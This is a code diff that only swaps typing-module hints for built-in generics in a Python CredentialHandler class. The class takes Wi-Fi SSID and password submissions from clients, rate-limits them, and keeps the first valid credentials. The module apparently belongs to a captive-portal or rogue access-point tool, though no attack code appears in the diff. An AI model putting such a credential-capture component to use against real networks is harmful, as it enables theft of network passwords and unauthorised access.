@@ -9,7 +9,7 @@ Handles credential submissions, validation queueing, and response management.
 
 import time
 import threading
-from typing import Optional, Callable, Dict, List, Tuple
+from typing import Optional, Callable
 from queue import Queue, Empty, Full
 from dataclasses import dataclass
 
@@ -107,7 +107,7 @@ class CredentialHandler:
         self.submission_callback = callback
         log_debug('CredentialHandler', 'Submission callback set')
     
-    def submit_credentials(self, ssid: str, password: str, client_ip: str) -> Tuple[bool, str]:
+    def submit_credentials(self, ssid: str, password: str, client_ip: str) -> tuple[bool, str]:
         """
         Handle a credential submission.
         
@@ -172,7 +172,7 @@ class CredentialHandler:
             log_error('CredentialHandler', f'Error handling submission: {e}', e)
             return False, 'An error occurred. Please try again.'
     
-    def check_and_record(self, ssid: str, password: str, client_ip: str) -> Tuple[bool, str]:
+    def check_and_record(self, ssid: str, password: str, client_ip: str) -> tuple[bool, str]:
         """
         Gate a submission inline: validate input format and enforce per-client
         rate limiting, recording the attempt.
@@ -335,7 +335,7 @@ class CredentialHandler:
         """
         return len(self.valid_credentials) > 0
     
-    def get_valid_credentials(self) -> Optional[Tuple[str, str]]:
+    def get_valid_credentials(self) -> Optional[tuple[str, str]]:
         """
         Get the first valid credentials found.
         
@@ -346,7 +346,7 @@ class CredentialHandler:
             return self.valid_credentials[0]
         return None
     
-    def get_statistics(self) -> Dict:
+    def get_statistics(self) -> dict:
         """
         Get handler statistics.
         
@@ -375,7 +375,7 @@ class CredentialHandler:
         """
         return self.client_attempts.get(client_ip, 0)
     
-    def get_all_submissions(self) -> List[CredentialSubmission]:
+    def get_all_submissions(self) -> list[CredentialSubmission]:
         """
         Get all submissions (pending and completed).
         
@@ -397,7 +397,7 @@ class CredentialHandler:
         
         return submissions
     
-    def get_validation_results(self) -> List[ValidationResult]:
+    def get_validation_results(self) -> list[ValidationResult]:
         """
         Get all validation results.
         
